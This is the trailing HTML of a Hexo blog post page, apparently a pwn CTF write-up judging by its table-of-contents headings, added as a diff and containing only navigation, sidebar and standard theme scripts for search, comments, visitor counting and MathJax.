+              <a href="/2017/08/12/hihoCoder-162周：回文字符串/" rel="next" title="hihoCoder 162周：回文字符串">
+                <i class="fa fa-chevron-left"></i> hihoCoder 162周：回文字符串
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/3017/06/19/ACM-OJ-长期更新/" rel="prev" title="ACM-OJ[长期更新]">
+                ACM-OJ[长期更新] <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTAzNC81NjAz"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="chybeta" />
+          <p class="site-author-name" itemprop="name">chybeta</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">80</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">44</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/CHYbeta" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/chybeta" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://ph0en1x.com/" title="XMU-Ph0en1x" target="_blank">XMU-Ph0en1x</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://lxpark.com/" title="lzhtony" target="_blank">lzhtony</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.cnblogs.com/findneo/" title="findneo" target="_blank">findneo</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.madsome.cn" title="Mads" target="_blank">Mads</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">1.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本功能"><span class="nav-number">1.1.</span> <span class="nav-text">基本功能</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#泄露canary"><span class="nav-number">1.2.</span> <span class="nav-text">泄露canary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#泄露libc"><span class="nav-number">1.3.</span> <span class="nav-text">泄露libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">1.4.</span> <span class="nav-text">getshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exp"><span class="nav-number">2.</span> <span class="nav-text">exp</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chybeta</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+      <!-- UY BEGIN -->
+      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
+      <!-- UY END -->
+  
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("unqDDYqYUADBUogKkMVqqvFH-gzGzoHsz", "afr1xO80LoKo0xCpxHJCleC4");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  <script type='text/javascript' color='252,3,184' zIndex='-1' opacity='20' count='99' src='//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js'></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
